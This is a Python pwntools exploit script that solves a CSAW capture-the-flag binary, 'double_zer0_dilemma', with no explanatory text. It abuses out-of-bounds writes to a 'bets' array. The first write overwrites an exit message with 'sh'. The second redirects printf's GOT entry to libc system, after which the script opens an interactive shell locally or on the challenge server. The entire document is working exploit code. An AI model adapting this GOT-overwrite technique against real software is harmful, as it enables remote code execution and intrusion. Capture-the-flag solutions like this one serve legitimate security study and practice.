#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from ctypes import c_int64

from pwn import *

elf = context.binary = ELF("./double_zer0_dilemma", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc double-zer0.csaw.io 9999"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

libc = elf.libc
libc.address = 0x00007ffff7d84000

if args.REMOTE:
    libc = ELF("./libc-2.31.so")
    libc.address = 0x7ffff7dd0000

exit_msg_idx = (elf.symbols["exit_msg"] - elf.symbols["bets"]) // 8
io.sendlineafter(b"land on: \n", str(exit_msg_idx).encode())
exit_msg = u64(b'Your total'[:8])
target = u64(b"sh\x00\x01\x02\x03\x04\x05") * 2
diff = c_int64(target - exit_msg).value
io.sendlineafter(b"wager: \n", str(diff).encode())

printf_got_idx = (elf.got["printf"] - elf.symbols["bets"]) // 8
io.sendlineafter(b"land on: \n", str(printf_got_idx).encode())
old_val = 0x401040
target = libc.symbols["system"] * 2
diff = c_int64(target - old_val).value
io.sendlineafter(b"wager: \n", str(diff).encode())

io.interactive()
